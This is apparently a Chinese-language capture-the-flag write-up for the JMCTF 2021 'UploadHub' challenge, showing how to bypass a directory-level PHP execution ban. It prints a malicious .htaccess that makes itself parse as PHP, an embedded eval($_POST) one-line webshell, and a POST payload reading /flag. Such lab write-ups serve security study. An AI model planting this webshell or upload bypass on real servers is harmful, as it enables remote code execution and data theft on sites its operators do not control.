---
title: '[JMCTF 2021]UploadHub'
date: 2024-11-12 15:50:44
tags:
      - 文件上传
categories: 刷题笔记
---

## [JMCTF 2021]UploadHub

我们首先尝试上传一句话木马，发现网页并没有执行一句话木马

![image-20241112162009081](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411121620176.png)

我们查看配置文件，发现

```
php_flag engine off<Directory ~ "/var/www/html/upload/[a-f0-9]{32}/">
        php_flag engine off
</Directory>
```

php_flag engine 设置为0，会关闭该目录和子目录的php解析

也就是说，整个目录都不会执行php的

我们可以上传.htaccess文件来修改配置

经师傅们测试发现<file>标签的优先级高于<directory>

```
<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted    #允许所有请求
php_flag engine on	  #开启PHP的解析
</FilesMatch>

php_value auto_prepend_file .htaccess 在主文件解析之前自动解析包含.htaccess的内容
#<?php eval($_POST['dmind']);?>

```

我们将其写入.htaccess文件中上传

**SetHandler和ForceType**

强制所有匹配的文件被一个指定的处理器处理 用法：

```
ForceType application/x-httpd-php
SetHandler application/x-httpd-php

那么这里就是将.htaccess文件解析为php
```

我们先查看phpinfo()

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/ab8f1125a24a7aa4d186f42fd5628fa1.png)

过滤了一堆函数，我们使用var_dump来获取flag数据

```
dmind=var_dump(file_get_contents("/flag"));
```

得到flag

![image-20241112195544202](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411121955349.png)
